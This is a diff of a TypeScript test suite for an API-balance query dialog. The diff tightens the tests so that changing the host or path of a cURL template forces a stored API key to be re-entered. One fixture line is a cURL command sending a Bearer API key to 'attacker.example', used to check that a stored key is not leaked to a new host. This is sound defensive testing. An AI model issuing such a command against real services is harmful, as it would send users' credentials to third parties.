@@ -282,12 +282,12 @@ try {
     hostPreset.dispatchEvent(new dom.window.Event('change'));
     assert.equal(hostKey.required, true, 'preset change with a stored key must require re-entry');
     const savesBeforeHostSwitch = saves.length;
-    hostDialog.querySelector<HTMLFormElement>('#balance-query-form')!.requestSubmit();
+    hostDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
     await flush();
     assert.equal(saves.length, savesBeforeHostSwitch, 'stored key must not be reused for a new host');
     assert.match(hostError.textContent!, /请重新输入/);
     hostKey.value = 'sk-synthetic-new-host-key';
-    hostDialog.querySelector<HTMLFormElement>('#balance-query-form')!.requestSubmit();
+    hostDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
     await flush();
     assert.equal(saves.length, savesBeforeHostSwitch + 1);
     assert.equal(saves.at(-1)!.apiKey, 'sk-synthetic-new-host-key');
@@ -300,17 +300,21 @@ try {
     const savesBeforeManualHost = saves.length;
     editCurl.value = "curl https://attacker.example/api/user/self \\\n  -H 'Authorization: Bearer {{API_KEY}}'";
     editCurl.dispatchEvent(new dom.window.Event('input'));
-    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.requestSubmit();
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
     await flush();
     assert.equal(saves.length, savesBeforeManualHost, 'manual host change must not reuse the stored key');
     assert.match(editError.textContent!, /请重新输入/);
-    // Changing only the path on the same host keeps the stored key (existing behavior).
+    // Any template edit, even path-only on the same host, requires the key to be re-entered.
     editCurl.value = "curl https://你的NewAPI地址/api/usage/token/ \\\n  -H 'Authorization: Bearer {{API_KEY}}'";
     editCurl.dispatchEvent(new dom.window.Event('input'));
-    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.requestSubmit();
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
     await flush();
-    assert.equal(saves.length, savesBeforeManualHost + 1, 'same-host edit with blank key must keep the stored key');
-    assert.ok(!saves.at(-1)!.apiKey);
+    assert.equal(saves.length, savesBeforeManualHost, 'path edit with blank key must not reuse the stored key');
+    editDialog.querySelector<HTMLInputElement>('#balance-query-key')!.value = 'sk-synthetic-path-key';
+    editDialog.querySelector<HTMLFormElement>('#balance-query-form')!.dispatchEvent(new dom.window.Event('submit', { cancelable: true }));
+    await flush();
+    assert.equal(saves.length, savesBeforeManualHost + 1);
+    assert.equal(saves.at(-1)!.apiKey, 'sk-synthetic-path-key');
     savedKey = '';
   }
 
